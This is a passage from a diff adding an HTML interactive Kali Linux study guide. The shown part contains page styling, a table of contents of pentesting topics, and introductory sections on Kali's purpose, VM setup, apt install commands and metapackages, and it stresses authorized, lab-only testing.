@@ -1,0 +1,2002 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="color-scheme" content="dark light">
+<meta name="description" content="An interactive study guide: Kali Linux Study Guide.">
+<title>Kali Linux Study Guide - Interactive</title>
+<style>
+:root{
+  --bg:#08090b; --bg2:#0e0f13; --panel:#121319; --panel2:#171922;
+  --border:#23252f; --border2:#2c2f3b;
+  --txt:#e6e8ee; --muted:#9aa0ad; --faint:#6b7180;
+  --accent:#875ee9; --accent2:#be59e3; --accent-weak:rgba(135,94,233,.13);
+  --warn:#fbbf24; --good:#4ade80; --bad:#f87171;
+  --radius:12px; --radius-sm:8px;
+  --mono:ui-monospace,"SF Mono",SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  --sidebar-w:310px;
+}
+html[data-theme="light"]{
+  --bg:#f6f7f9; --bg2:#eef0f4; --panel:#ffffff; --panel2:#f3f4f7;
+  --border:#e2e5eb; --border2:#d3d7e0;
+  --txt:#1b1f27; --muted:#5a6170; --faint:#878e9c;
+  --accent:#875ee9; --accent2:#be59e3; --accent-weak:rgba(135,94,233,.13);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--txt);font-family:var(--sans);
+  line-height:1.65;font-size:16px;-webkit-font-smoothing:antialiased;
+}
+a{color:var(--accent2);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* progress bar */
+#progress{position:fixed;top:0;left:0;height:3px;width:0;z-index:60;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .1s linear}
+
+/* top bar */
+header.topbar{
+  position:sticky;top:0;z-index:50;display:flex;align-items:center;gap:14px;
+  padding:10px 18px;background:rgba(8,9,11,.82);backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--border);
+}
+html[data-theme="light"] header.topbar{background:rgba(246,247,249,.85)}
+.brand{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:-.01em;white-space:nowrap}
+.brand .logo{width:26px;height:26px;border-radius:7px;display:grid;place-items:center;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));color:#04201c;font-weight:800;font-size:15px}
+.brand .sub{color:var(--faint);font-weight:500;font-size:13px}
+.spacer{flex:1}
+.search{position:relative;display:flex;align-items:center;max-width:340px;flex:1}
+.search input{
+  width:100%;padding:8px 12px 8px 34px;border-radius:999px;border:1px solid var(--border2);
+  background:var(--panel);color:var(--txt);font-size:14px;outline:none}
+.search input:focus{border-color:var(--accent)}
+.search svg{position:absolute;left:11px;width:15px;height:15px;color:var(--faint)}
+.search kbd{position:absolute;right:10px;color:var(--faint);font-family:var(--mono);font-size:11px;
+  border:1px solid var(--border2);border-radius:5px;padding:1px 5px;background:var(--bg2)}
+.iconbtn{display:grid;place-items:center;width:38px;height:38px;border-radius:9px;cursor:pointer;
+  border:1px solid var(--border2);background:var(--panel);color:var(--txt)}
+.iconbtn:hover{border-color:var(--accent)}
+#menuBtn{display:none}
+
+/* layout */
+.layout{display:grid;grid-template-columns:var(--sidebar-w) minmax(0,1fr);gap:0;align-items:start}
+aside.sidebar{
+  position:sticky;top:59px;height:calc(100vh - 59px);overflow-y:auto;
+  border-right:1px solid var(--border);padding:18px 10px 60px;background:var(--bg)}
+aside.sidebar::-webkit-scrollbar{width:9px}
+aside.sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:9px}
+.toc ul{list-style:none;margin:0;padding:0}
+.toc li a{display:block;padding:5px 12px;border-radius:7px;color:var(--muted);font-size:13.5px;
+  border-left:2px solid transparent;transition:color .12s,background .12s}
+.toc li a:hover{color:var(--txt);background:var(--panel);text-decoration:none}
+.toc .toc-l2 a{font-weight:600;color:var(--txt);margin-top:6px}
+.toc .toc-l3 a{padding-left:26px;font-size:12.8px}
+.toc a.active{color:var(--accent);background:var(--accent-weak);border-left-color:var(--accent)}
+.toc li.hide{display:none}
+
+main{padding:32px clamp(18px,5vw,64px) 120px;max-width:1000px}
+.lead{color:var(--muted);font-size:15px}
+
+/* typography */
+h1{font-size:clamp(28px,4vw,40px);line-height:1.15;letter-spacing:-.02em;margin:.2em 0 .4em}
+h2{font-size:clamp(22px,3vw,29px);letter-spacing:-.01em;margin:2.2em 0 .7em;padding-bottom:.3em;
+  border-bottom:1px solid var(--border);scroll-margin-top:74px;cursor:pointer;position:relative}
+h2::after{content:"–";position:absolute;right:2px;top:0;color:var(--faint);font-weight:400;
+  transition:transform .15s;opacity:.6}
+h2.collapsed::after{content:"+"}
+h3{font-size:19px;margin:1.8em 0 .5em;color:var(--txt);scroll-margin-top:74px}
+h2+*,h3+*{margin-top:0}
+p{margin:.7em 0}
+strong{color:var(--txt)}
+blockquote{margin:1.1em 0;padding:.6em 1.1em;border-left:3px solid var(--accent);
+  background:var(--accent-weak);border-radius:0 var(--radius-sm) var(--radius-sm) 0;color:var(--txt)}
+blockquote em{font-style:italic;color:var(--txt)}
+hr{border:none;border-top:1px solid var(--border);margin:2.4em 0}
+ul,ol{padding-left:1.3em}
+li{margin:.3em 0}
+
+/* inline code */
+:not(pre)>code{font-family:var(--mono);font-size:.86em;background:var(--panel2);
+  border:1px solid var(--border);border-radius:6px;padding:.1em .4em;color:#e7c6a0}
+html[data-theme="light"] :not(pre)>code{color:#9a5b00}
+
+/* code blocks */
+.codewrap{position:relative;margin:1.2em 0;border:1px solid var(--border);border-radius:var(--radius);
+  background:var(--bg2);overflow:hidden}
+.codebar{display:flex;align-items:center;justify-content:space-between;
+  padding:7px 12px;background:var(--panel);border-bottom:1px solid var(--border)}
+.codebar .lang{font-family:var(--mono);font-size:11.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--faint)}
+.copybtn{display:inline-flex;align-items:center;gap:6px;cursor:pointer;border:1px solid var(--border2);
+  background:var(--bg2);color:var(--muted);font-size:12px;padding:4px 9px;border-radius:7px;font-family:var(--sans)}
+.copybtn:hover{border-color:var(--accent);color:var(--txt)}
+.copybtn.ok{color:var(--good);border-color:var(--good)}
+.codewrap pre{margin:0;padding:14px 16px;overflow-x:auto;font-family:var(--mono);font-size:13.3px;line-height:1.6}
+.codewrap pre::-webkit-scrollbar{height:9px}
+.codewrap pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:9px}
+code .c{color:#6b7180;font-style:italic}      /* comment */
+code .s{color:#9ece9a}                          /* string */
+code .k{color:#7dd3fc}                          /* keyword/directive */
+code .n{color:#e5b873}                          /* number/duration */
+code .ph{color:#f0abfc}                         /* placeholder {..} */
+code .m{color:#fca5a5}                           /* matcher @name */
+code .a{color:#7dd3fc}                           /* attr/key */
+code .b{color:#f0abfc}                           /* boolean/const */
+code .p{color:#8b93a3}                           /* punctuation */
+code .site{color:#5eead4;font-weight:600}        /* site address */
+
+/* tables */
+.tablewrap{overflow-x:auto;margin:1.2em 0;border:1px solid var(--border);border-radius:var(--radius)}
+table{border-collapse:collapse;width:100%;font-size:14px}
+th,td{text-align:left;padding:9px 13px;border-bottom:1px solid var(--border)}
+thead th{background:var(--panel);color:var(--txt);font-weight:600;position:sticky;top:0}
+tbody tr:hover{background:var(--panel2)}
+tbody tr:last-child td{border-bottom:none}
+
+/* add-ons: quiz + decision */
+.addon{margin:1.8em 0;border:1px solid var(--border2);border-radius:var(--radius);
+  background:linear-gradient(180deg,var(--panel),var(--bg2));overflow:hidden}
+.addon-head{padding:16px 18px 4px}
+.addon-kicker{display:inline-block;font-size:11px;letter-spacing:.12em;text-transform:uppercase;
+  color:var(--accent);font-weight:700}
+.addon-head h3{margin:.25em 0 .1em;scroll-margin-top:0}
+.addon-sub{margin:.1em 0 0;color:var(--faint);font-size:13.5px}
+.quiz-item{padding:8px 18px 16px;border-top:1px solid var(--border);margin-top:12px}
+.quiz-item:first-of-type{border-top:none;margin-top:0}
+.quiz-q{font-weight:600;margin:.6em 0 .7em}
+.quiz-n{display:inline-grid;place-items:center;min-width:26px;height:22px;margin-right:9px;padding:0 6px;
+  border-radius:6px;background:var(--accent-weak);color:var(--accent);font-size:12px;font-weight:700;font-family:var(--mono)}
+.quiz-opts{list-style:none;padding:0;margin:0;display:grid;gap:7px}
+.quiz-opt{display:flex;align-items:center;gap:10px;width:100%;text-align:left;cursor:pointer;
+  border:1px solid var(--border2);background:var(--bg2);color:var(--txt);font-size:14px;
+  padding:9px 12px;border-radius:9px;font-family:var(--sans);transition:border-color .12s,background .12s}
+.quiz-opt:hover{border-color:var(--accent)}
+.quiz-mark{width:16px;height:16px;border-radius:50%;border:2px solid var(--faint);flex:none}
+.quiz-opt.correct{border-color:var(--good);background:rgba(74,222,128,.10)}
+.quiz-opt.correct .quiz-mark{border-color:var(--good);background:var(--good)}
+.quiz-opt.wrong{border-color:var(--bad);background:rgba(248,113,113,.10)}
+.quiz-opt.wrong .quiz-mark{border-color:var(--bad);background:var(--bad)}
+.quiz-opt.locked{cursor:default;opacity:.7}
+.quiz-opt.locked.correct,.quiz-opt.locked.wrong{opacity:1}
+.quiz-explain{margin:11px 0 2px;padding:10px 12px;border-radius:8px;background:var(--panel2);
+  border-left:3px solid var(--accent);font-size:13.6px;color:var(--muted)}
+
+.decision-grid{display:grid;grid-template-columns:1fr 1fr;gap:9px;padding:14px 18px}
+.dchip{display:flex;align-items:flex-start;gap:9px;font-size:13.6px;color:var(--txt);cursor:pointer;
+  border:1px solid var(--border2);background:var(--bg2);padding:9px 11px;border-radius:9px}
+.dchip:hover{border-color:var(--accent)}
+.dchip input{margin-top:2px;accent-color:var(--accent)}
+.decision-out{margin:4px 18px 18px;padding:14px 16px;border-radius:10px;background:var(--panel2);
+  border:1px solid var(--border)}
+.decision-verdict{font-weight:700;font-size:15px}
+.decision-verdict.caddy{color:var(--good)}
+.decision-verdict.maybe{color:var(--warn)}
+.decision-verdict.alt{color:var(--accent2)}
+.decision-reasons{margin:8px 0 0;color:var(--muted);font-size:13.5px}
+
+/* search highlight */
+mark.hit{background:var(--accent);color:#04201c;border-radius:3px;padding:0 2px}
+
+/* back to top */
+#toTop{position:fixed;right:22px;bottom:22px;width:44px;height:44px;border-radius:50%;
+  display:grid;place-items:center;cursor:pointer;border:1px solid var(--border2);
+  background:var(--panel);color:var(--txt);opacity:0;pointer-events:none;transition:opacity .2s,transform .2s}
+#toTop.show{opacity:1;pointer-events:auto}
+#toTop:hover{border-color:var(--accent);transform:translateY(-2px)}
+
+.scrim{display:none}
+.collapsed-body{display:none !important}
+
+@media(max-width:980px){
+  :root{--sidebar-w:0px}
+  #menuBtn{display:grid}
+  .layout{grid-template-columns:1fr}
+  aside.sidebar{position:fixed;top:0;left:0;height:100vh;width:300px;z-index:70;
+    transform:translateX(-100%);transition:transform .25s;border-right:1px solid var(--border);
+    padding-top:16px;background:var(--bg)}
+  aside.sidebar.open{transform:none}
+  .scrim.show{display:block;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:65}
+  .search{max-width:none}
+  .brand .sub{display:none}
+  .decision-grid{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  body{font-size:15px}
+  .search kbd{display:none}
+  main{padding:22px 16px 100px}
+}
+</style>
+</head>
+<body>
+<div id="progress"></div>
+<header class="topbar">
+  <button id="menuBtn" class="iconbtn" aria-label="Toggle menu">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+  </button>
+  <div class="brand"><span class="logo">K</span><span>Kali Linux Study Guide</span><span class="sub">interactive</span></div>
+  <div class="spacer"></div>
+  <div class="search">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    <input id="search" type="search" placeholder="Search the guide..." aria-label="Search" autocomplete="off">
+    <kbd>/</kbd>
+  </div>
+  <button id="themeBtn" class="iconbtn" aria-label="Toggle theme" title="Toggle theme (t)">
+    <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+  </button>
+</header>
+<div class="scrim"></div>
+<div class="layout">
+  <aside class="sidebar"><nav class="toc" aria-label="Table of contents"><ul><li class="toc-l2"><a href="#quick-links" data-target="quick-links">Quick Links</a></li><li class="toc-l2"><a href="#1-what-kali-linux-actually-is" data-target="1-what-kali-linux-actually-is">1. What Kali Linux Actually Is</a></li><li class="toc-l3"><a href="#when-kali-is-the-right-choice" data-target="when-kali-is-the-right-choice">When Kali is the right choice</a></li><li class="toc-l3"><a href="#when-kali-is-not-the-right-choice" data-target="when-kali-is-not-the-right-choice">When Kali is not the right choice</a></li><li class="toc-l3"><a href="#best-first-setup" data-target="best-first-setup">Best first setup</a></li><li class="toc-l3"><a href="#first-commands-to-know" data-target="first-commands-to-know">First commands to know</a></li><li class="toc-l2"><a href="#2-how-kali-organizes-its-tools" data-target="2-how-kali-organizes-its-tools">2. How Kali Organizes Its Tools</a></li><li class="toc-l3"><a href="#core-kali-metapackages" data-target="core-kali-metapackages">Core Kali metapackages</a></li><li class="toc-l3"><a href="#official-workflow-oriented-metapackages" data-target="official-workflow-oriented-metapackages">Official workflow-oriented metapackages</a></li><li class="toc-l3"><a href="#specialized-kali-metapackages" data-target="specialized-kali-metapackages">Specialized Kali metapackages</a></li><li class="toc-l3"><a href="#the-smart-way-to-study-kali" data-target="the-smart-way-to-study-kali">The smart way to study Kali</a></li><li class="toc-l2"><a href="#3-how-to-explore-kali-without-getting-lost" data-target="3-how-to-explore-kali-without-getting-lost">3. How To Explore Kali Without Getting Lost</a></li><li class="toc-l3"><a href="#useful-discovery-habits" data-target="useful-discovery-habits">Useful discovery habits</a></li><li class="toc-l3"><a href="#important-directories" data-target="important-directories">Important directories</a></li><li class="toc-l3"><a href="#a-simple-learn-any-tool-pattern" data-target="a-simple-learn-any-tool-pattern">A simple "learn any tool" pattern</a></li><li class="toc-l2"><a href="#4-information-gathering-and-osint" data-target="4-information-gathering-and-osint">4. Information Gathering and OSINT</a></li><li class="toc-l3"><a href="#typical-questions-in-this-phase" data-target="typical-questions-in-this-phase">Typical questions in this phase</a></li><li class="toc-l3"><a href="#key-tools-to-learn" data-target="key-tools-to-learn">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-workflow-example" data-target="mini-workflow-example">Mini-workflow example</a></li><li class="toc-l3"><a href="#what-to-learn-here" data-target="what-to-learn-here">What to learn here</a></li><li class="toc-l3"><a href="#upstream-docs-worth-bookmarking" data-target="upstream-docs-worth-bookmarking">Upstream docs worth bookmarking</a></li><li class="toc-l2"><a href="#5-vulnerability-validation-and-service-enumeration" data-target="5-vulnerability-validation-and-service-enumeration">5. Vulnerability Validation and Service Enumeration</a></li><li class="toc-l3"><a href="#key-tools-to-learn_1" data-target="key-tools-to-learn_1">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-workflow-example_1" data-target="mini-workflow-example_1">Mini-workflow example</a></li><li class="toc-l3"><a href="#what-to-learn-here_1" data-target="what-to-learn-here_1">What to learn here</a></li><li class="toc-l2"><a href="#6-web-application-testing" data-target="6-web-application-testing">6. Web Application Testing</a></li><li class="toc-l3"><a href="#key-tools-to-learn_2" data-target="key-tools-to-learn_2">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-scenario" data-target="mini-scenario">Mini-scenario</a></li><li class="toc-l3"><a href="#how-to-think-in-this-phase" data-target="how-to-think-in-this-phase">How to think in this phase</a></li><li class="toc-l3"><a href="#upstream-docs-worth-bookmarking_1" data-target="upstream-docs-worth-bookmarking_1">Upstream docs worth bookmarking</a></li><li class="toc-l2"><a href="#7-password-attacks-and-wordlists" data-target="7-password-attacks-and-wordlists">7. Password Attacks and Wordlists</a></li><li class="toc-l3"><a href="#key-tools-to-learn_3" data-target="key-tools-to-learn_3">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-workflow-example_2" data-target="mini-workflow-example_2">Mini-workflow example</a></li><li class="toc-l3"><a href="#what-to-learn-here_2" data-target="what-to-learn-here_2">What to learn here</a></li><li class="toc-l3"><a href="#upstream-docs-worth-bookmarking_2" data-target="upstream-docs-worth-bookmarking_2">Upstream docs worth bookmarking</a></li><li class="toc-l2"><a href="#8-windows-active-directory-and-post-exploitation" data-target="8-windows-active-directory-and-post-exploitation">8. Windows, Active Directory, and Post-Exploitation</a></li><li class="toc-l3"><a href="#key-tools-to-learn_4" data-target="key-tools-to-learn_4">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-workflow-example_3" data-target="mini-workflow-example_3">Mini-workflow example</a></li><li class="toc-l3"><a href="#what-to-learn-here_3" data-target="what-to-learn-here_3">What to learn here</a></li><li class="toc-l2"><a href="#9-exploitation-frameworks-and-exploit-research" data-target="9-exploitation-frameworks-and-exploit-research">9. Exploitation Frameworks and Exploit Research</a></li><li class="toc-l3"><a href="#key-tools-to-learn_5" data-target="key-tools-to-learn_5">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-workflow-example_4" data-target="mini-workflow-example_4">Mini-workflow example</a></li><li class="toc-l3"><a href="#metasploit-concepts-worth-mastering" data-target="metasploit-concepts-worth-mastering">Metasploit concepts worth mastering</a></li><li class="toc-l3"><a href="#upstream-docs-worth-bookmarking_3" data-target="upstream-docs-worth-bookmarking_3">Upstream docs worth bookmarking</a></li><li class="toc-l2"><a href="#10-sniffing-spoofing-and-relay-attacks" data-target="10-sniffing-spoofing-and-relay-attacks">10. Sniffing, Spoofing, and Relay Attacks</a></li><li class="toc-l3"><a href="#key-tools-to-learn_6" data-target="key-tools-to-learn_6">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-scenario_1" data-target="mini-scenario_1">Mini-scenario</a></li><li class="toc-l3"><a href="#what-to-learn-here_4" data-target="what-to-learn-here_4">What to learn here</a></li><li class="toc-l3"><a href="#upstream-docs-worth-bookmarking_4" data-target="upstream-docs-worth-bookmarking_4">Upstream docs worth bookmarking</a></li><li class="toc-l2"><a href="#11-wireless-bluetooth-rfid-sdr-and-hardware" data-target="11-wireless-bluetooth-rfid-sdr-and-hardware">11. Wireless, Bluetooth, RFID, SDR, and Hardware</a></li><li class="toc-l3"><a href="#key-tools-to-learn_7" data-target="key-tools-to-learn_7">Key tools to learn</a></li><li class="toc-l3"><a href="#wi-fi-mini-workflow-example" data-target="wi-fi-mini-workflow-example">Wi-Fi mini-workflow example</a></li><li class="toc-l3"><a href="#what-to-learn-here_5" data-target="what-to-learn-here_5">What to learn here</a></li><li class="toc-l2"><a href="#12-reverse-engineering-mobile-and-firmware" data-target="12-reverse-engineering-mobile-and-firmware">12. Reverse Engineering, Mobile, and Firmware</a></li><li class="toc-l3"><a href="#key-tools-to-learn_8" data-target="key-tools-to-learn_8">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-scenario_2" data-target="mini-scenario_2">Mini-scenario</a></li><li class="toc-l3"><a href="#what-to-learn-here_6" data-target="what-to-learn-here_6">What to learn here</a></li><li class="toc-l3"><a href="#upstream-docs-worth-bookmarking_5" data-target="upstream-docs-worth-bookmarking_5">Upstream docs worth bookmarking</a></li><li class="toc-l2"><a href="#13-forensics-incident-response-and-recovery" data-target="13-forensics-incident-response-and-recovery">13. Forensics, Incident Response, and Recovery</a></li><li class="toc-l3"><a href="#key-tools-to-learn_9" data-target="key-tools-to-learn_9">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-workflow-example_5" data-target="mini-workflow-example_5">Mini-workflow example</a></li><li class="toc-l3"><a href="#what-to-learn-here_7" data-target="what-to-learn-here_7">What to learn here</a></li><li class="toc-l2"><a href="#14-cloud-secrets-and-code-focused-security-work" data-target="14-cloud-secrets-and-code-focused-security-work">14. Cloud, Secrets, and Code-Focused Security Work</a></li><li class="toc-l3"><a href="#key-tools-to-learn_10" data-target="key-tools-to-learn_10">Key tools to learn</a></li><li class="toc-l3"><a href="#mini-scenario_3" data-target="mini-scenario_3">Mini-scenario</a></li><li class="toc-l3"><a href="#what-to-learn-here_8" data-target="what-to-learn-here_8">What to learn here</a></li><li class="toc-l2"><a href="#15-social-engineering-tools" data-target="15-social-engineering-tools">15. Social Engineering Tools</a></li><li class="toc-l3"><a href="#key-tools-to-know" data-target="key-tools-to-know">Key tools to know</a></li><li class="toc-l3"><a href="#how-to-study-this-safely" data-target="how-to-study-this-safely">How to study this safely</a></li><li class="toc-l2"><a href="#16-reporting-screenshots-and-team-workflow" data-target="16-reporting-screenshots-and-team-workflow">16. Reporting, Screenshots, and Team Workflow</a></li><li class="toc-l3"><a href="#key-tools-to-learn_11" data-target="key-tools-to-learn_11">Key tools to learn</a></li><li class="toc-l3"><a href="#reporting-mindset" data-target="reporting-mindset">Reporting mindset</a></li><li class="toc-l2"><a href="#17-a-good-kali-study-roadmap" data-target="17-a-good-kali-study-roadmap">17. A Good Kali Study Roadmap</a></li><li class="toc-l3"><a href="#stage-1-learn-kali-itself" data-target="stage-1-learn-kali-itself">Stage 1: Learn Kali itself</a></li><li class="toc-l3"><a href="#stage-2-learn-recon-and-validation" data-target="stage-2-learn-recon-and-validation">Stage 2: Learn recon and validation</a></li><li class="toc-l3"><a href="#stage-3-learn-web-testing" data-target="stage-3-learn-web-testing">Stage 3: Learn web testing</a></li><li class="toc-l3"><a href="#stage-4-learn-passwords-and-ad" data-target="stage-4-learn-passwords-and-ad">Stage 4: Learn passwords and AD</a></li><li class="toc-l3"><a href="#stage-5-learn-packets-and-wireless" data-target="stage-5-learn-packets-and-wireless">Stage 5: Learn packets and wireless</a></li><li class="toc-l3"><a href="#stage-6-learn-reverse-engineering-and-forensics" data-target="stage-6-learn-reverse-engineering-and-forensics">Stage 6: Learn reverse engineering and forensics</a></li><li class="toc-l3"><a href="#a-strong-beginner-to-intermediate-order" data-target="a-strong-beginner-to-intermediate-order">A strong beginner-to-intermediate order</a></li><li class="toc-l2"><a href="#18-documentation-hub" data-target="18-documentation-hub">18. Documentation Hub</a></li><li class="toc-l3"><a href="#kali-foundation-docs" data-target="kali-foundation-docs">Kali foundation docs</a></li><li class="toc-l3"><a href="#major-tool-pages-in-kali" data-target="major-tool-pages-in-kali">Major tool pages in Kali</a></li><li class="toc-l3"><a href="#upstream-docs-that-are-especially-useful" data-target="upstream-docs-that-are-especially-useful">Upstream docs that are especially useful</a></li><li class="toc-l2"><a href="#final-advice" data-target="final-advice">Final Advice</a></li></ul></nav></aside>
+  <main><h1 id="kali-linux-study-guide">Kali Linux Study Guide</h1>
+<p>A practical, lab-first guide to Kali Linux and the major pentesting tool families it ships with. Kali is not just "Linux with hacking tools". It is a purpose-built distribution for authorized penetration testing, security auditing, incident response, reverse engineering, wireless work, and forensics.</p>
+<p>This guide was assembled on April 9, 2026 using the current Kali documentation, the official Kali metapackages page, and the official all-tools index. Kali ships with hundreds of packages, so the right way to study it is not to memorize every binary in one sitting. The right way is to understand:</p>
+<ol>
+<li>what Kali is optimized for</li>
+<li>how Kali groups tools into metapackages and workflows</li>
+<li>which tools matter most in each phase of a pentest</li>
+<li>how to practice safely in a lab</li>
+</ol>
+<p>The examples below use lab targets, local hosts, or documentation-only networks such as <code>192.0.2.0/24</code> and <code>198.51.100.0/24</code>. Only use these tools on systems you own or have explicit written authorization to test.</p>
+<hr>
+<h2 id="quick-links">Quick Links</h2>
+<ul>
+<li>Kali docs home: <a href="https://www.kali.org/docs/">https://www.kali.org/docs/</a></li>
+<li>All Kali tools: <a href="https://www.kali.org/tools/all-tools/">https://www.kali.org/tools/all-tools/</a></li>
+<li>Kali metapackages: <a href="https://www.kali.org/docs/general-use/metapackages/">https://www.kali.org/docs/general-use/metapackages/</a></li>
+<li>Should I Use Kali Linux?: <a href="https://www.kali.org/docs/introduction/should-i-use-kali-linux/">https://www.kali.org/docs/introduction/should-i-use-kali-linux/</a></li>
+<li>Updating Kali: <a href="https://www.kali.org/docs/general-use/updating-kali/">https://www.kali.org/docs/general-use/updating-kali/</a></li>
+<li>Kali sources list: <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/</a></li>
+<li>Which image should I download?: <a href="https://www.kali.org/docs/introduction/what-image-to-download/">https://www.kali.org/docs/introduction/what-image-to-download/</a></li>
+</ul>
+<hr>
+<h2 id="table-of-contents">Table of Contents</h2>
+<ol>
+<li><a href="#1-what-kali-linux-actually-is">What Kali Linux Actually Is</a></li>
+<li><a href="#2-how-kali-organizes-its-tools">How Kali Organizes Its Tools</a></li>
+<li><a href="#3-how-to-explore-kali-without-getting-lost">How To Explore Kali Without Getting Lost</a></li>
+<li><a href="#4-information-gathering-and-osint">Information Gathering and OSINT</a></li>
+<li><a href="#5-vulnerability-validation-and-service-enumeration">Vulnerability Validation and Service Enumeration</a></li>
+<li><a href="#6-web-application-testing">Web Application Testing</a></li>
+<li><a href="#7-password-attacks-and-wordlists">Password Attacks and Wordlists</a></li>
+<li><a href="#8-windows-active-directory-and-post-exploitation">Windows, Active Directory, and Post-Exploitation</a></li>
+<li><a href="#9-exploitation-frameworks-and-exploit-research">Exploitation Frameworks and Exploit Research</a></li>
+<li><a href="#10-sniffing-spoofing-and-relay-attacks">Sniffing, Spoofing, and Relay Attacks</a></li>
+<li><a href="#11-wireless-bluetooth-rfid-sdr-and-hardware">Wireless, Bluetooth, RFID, SDR, and Hardware</a></li>
+<li><a href="#12-reverse-engineering-mobile-and-firmware">Reverse Engineering, Mobile, and Firmware</a></li>
+<li><a href="#13-forensics-incident-response-and-recovery">Forensics, Incident Response, and Recovery</a></li>
+<li><a href="#14-cloud-secrets-and-code-focused-security-work">Cloud, Secrets, and Code-Focused Security Work</a></li>
+<li><a href="#15-social-engineering-tools">Social Engineering Tools</a></li>
+<li><a href="#16-reporting-screenshots-and-team-workflow">Reporting, Screenshots, and Team Workflow</a></li>
+<li><a href="#17-a-good-kali-study-roadmap">A Good Kali Study Roadmap</a></li>
+<li><a href="#18-documentation-hub">Documentation Hub</a></li>
+</ol>
+<hr>
+<h2 id="1-what-kali-linux-actually-is">1. What Kali Linux Actually Is</h2>
+<p>Kali is not meant to be a random "cool hacker OS". The official docs are very direct about this: Kali is specifically geared toward professional penetration testing and security auditing, and it is not recommended as a general-purpose distro if your main goal is gaming, office work, or casual Linux learning.</p>
+<p>Three Kali design ideas matter immediately:</p>
+<ul>
+<li><strong>Network services are disabled by default</strong></li>
+<li>This helps keep the system safer by default, even when you install server-like packages.</li>
+<li><strong>The kernel is customized for security work</strong></li>
+<li>Kali uses an upstream kernel with patches useful for tasks such as wireless injection.</li>
+<li><strong>The repositories are intentionally strict</strong></li>
+<li>Kali strongly discourages randomly adding PPAs or unrelated third-party repositories because they can break the system.</li>
+</ul>
+<h3 id="when-kali-is-the-right-choice">When Kali is the right choice</h3>
+<ul>
+<li>You want one distro with a large, curated security toolkit.</li>
+<li>You are studying penetration testing, wireless auditing, reverse engineering, DFIR, or offensive security workflows.</li>
+<li>You want official packaging for common security tools instead of maintaining dozens of manual installs.</li>
+</ul>
+<h3 id="when-kali-is-not-the-right-choice">When Kali is not the right choice</h3>
+<ul>
+<li>You are brand new to Linux and just want a daily driver.</li>
+<li>You expect every random desktop package repository to work cleanly.</li>
+<li>You want a stable non-security workstation first and a lab second.</li>
+</ul>
+<h3 id="best-first-setup">Best first setup</h3>
+<p>Use Kali in a VM before you install it bare metal. Snapshots are your friend. They turn "I broke the box" into "I learned something and rolled back".</p>
+<p>Good first options:</p>
+<ul>
+<li>VirtualBox or VMware image</li>
+<li>WSL if you mostly want CLI tooling</li>
+<li>A dedicated lab laptop or external SSD</li>
+<li>A live USB only for quick field work, not for deep study</li>
+</ul>
+<h3 id="first-commands-to-know">First commands to know</h3>
+<pre><code class="language-bash">sudo apt update
+sudo apt full-upgrade -y
+sudo apt install -y kali-linux-default
+</code></pre>
+<p>If you want a smaller, more focused build:</p>
+<pre><code class="language-bash">sudo apt install -y kali-tools-web kali-tools-passwords kali-tools-wireless
+</code></pre>
+<p>And if you want a menu-driven way to add tool groups:</p>
+<pre><code class="language-bash">kali-tweaks
+</code></pre>
+<hr>
+<h2 id="2-how-kali-organizes-its-tools">2. How Kali Organizes Its Tools</h2>
+<p>Kali uses <strong>metapackages</strong>. A metapackage is basically a bundle that pulls in a whole tool family. This matters because you do not need <code>kali-linux-everything</code> on day one. You can install just the parts that match what you are studying.</p>
+<h3 id="core-kali-metapackages">Core Kali metapackages</h3>
+<table>
+<thead>
+<tr>
+<th>Metapackage</th>
+<th>What it means</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>kali-linux-core</code></td>
+<td>Minimal base system</td>
+</tr>
+<tr>
+<td><code>kali-linux-headless</code></td>
+<td>CLI-first system without GUI expectations</td>
+</tr>
+<tr>
+<td><code>kali-linux-default</code></td>
+<td>Default desktop image toolset</td>
+</tr>
+<tr>
+<td><code>kali-linux-large</code></td>
+<td>Larger tool selection</td>
+</tr>
+<tr>
+<td><code>kali-linux-everything</code></td>
+<td>Nearly everything Kali ships</td>
+</tr>
+<tr>
+<td><code>kali-linux-labs</code></td>
+<td>Practice/lab resources</td>
+</tr>
+</tbody>
+</table>
+<h3 id="official-workflow-oriented-metapackages">Official workflow-oriented metapackages</h3>
+<p>These are the categories most people mean when they say "all the pentesting tools in Kali".</p>
+<table>
+<thead>
+<tr>
+<th>Metapackage</th>
+<th>Focus</th>
+<th>Think of it as</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>kali-tools-information-gathering</code></td>
